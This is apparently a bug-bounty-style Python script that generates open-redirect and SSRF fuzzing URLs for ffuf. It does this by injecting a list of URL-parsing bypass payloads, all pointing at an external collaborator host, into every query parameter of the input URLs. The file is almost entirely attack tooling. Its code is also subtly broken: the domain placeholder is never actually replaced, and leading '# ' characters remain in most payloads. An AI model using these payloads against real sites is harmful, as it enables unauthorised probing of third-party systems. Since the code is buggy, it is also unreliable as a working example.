#!/usr/bin/env python3

import argparse
import urllib 
from furl import furl 

# collaborator = 'https://ssrf.ragnarokv.site/webhook.php?u='
collaborator = 'https://ssrf.ragnarokv.site/'

payloads = '''
# https://ssrf.ragnarokv.site
# //ssrf.ragnarokv.site
# ///ssrf.ragnarokv.site
# \/\/ssrf.ragnarokv.site
# ssrf.ragnarokv%E3%80%82site
# @ssrf.ragnarokv.site
# http:http:ssrf.ragnarokv.site
# //ssrf.ragnarokv%00.site
# http:/ssrf.ragnarokv%252esite
# ///[[domain]]@ssrf.ragnarokv.site
# https:ssrf.ragnarokv.site
# \/\/ssrf.ragnarokv.site
# /\/ssrf.ragnarokv.site
# ////ssrf.ragnarokv%E3%80%82site
# //ssrf.ragnarokv.site
# ///[[domain]]@ssrf.ragnarokv.site
# http:http://ssrf.ragnarokv.site
# //.@.@ssrf.ragnarokv.site
# https://[[domain]]@ssrf.ragnarokv.site
# https://ssrf.ragnarokv.c℀.[[domain]]
# https://[[domain]]%09.ssrf.ragnarokv.site
# https://ssrf.ragnarokv.siteğ.[[domain]]
# ssrf.ragnarokv.site%00.[[domain]]
# https://ssrf.ragnarokv.site%00.[[domain]]
# https://ssrf.ragnarokv.site%ff.[[domain]]
# ssrf.ragnarokv.site%ff@[[domain]]
# https://ssrf.ragnarokv.site%E3%80%82.[[domain]]
# https://@ssrf.ragnarokv.site\\@[[domain]]
# //%09/ssrf.ragnarokv.site
# ////\;@ssrf.ragnarokv.site
# /https:ssrf.ragnarokv.site
'''

'''
https://ssrf.ragnarokv.site\udfff@[[domain]]
'''

t_payloads = [
    'https://ssrf.ragnarokv.site\\udfff@[[domain]]',
]


payloads = payloads.split('\n')
payloads = filter(None, payloads)
payloads = list(payloads)

payloads =  payloads +  t_payloads

# print(payloads)

def build_one_value(marker,payload,host):
    if '[[domain]]' in payload:
        payload.replace('[[domain]]',host)
    value = payload+'/'+marker
    return value
    


def process_onecopy(copy, param,payload):
    marker = copy.host + str(copy.path) + '/'+ param 
    # print('Inseted marker:             '+marker)
    value = build_one_value(marker,payload,copy.host)
    # print('Inseted value:             '+value)
    copy.args[param] = value
    # print('New Copy:           {}'.format(copy))
    # print('\n\n\n')
    return copy 

def process_url(url):
    f = furl(url)
    params = f.args
    #params omdict1D([('one', '1'), ('two', '2')])
    for payload in payloads:
        for param in params.keys():
            # params.key()[1, 2, 3]

            # print('Original url:          ')
            # print(f)
            new_furl = process_onecopy(f.copy(), param,payload)
            print(new_furl)





my_parser = argparse.ArgumentParser(description='Open redirect urls for ffuf to fuzz')

my_parser.add_argument('-f',
                       '--file',
                        required = True,
                        type=argparse.FileType('r'),
                       help='the location of input urls file')


                    
args = my_parser.parse_args()

urls_file = args.file

for url in urls_file:
    process_url(url)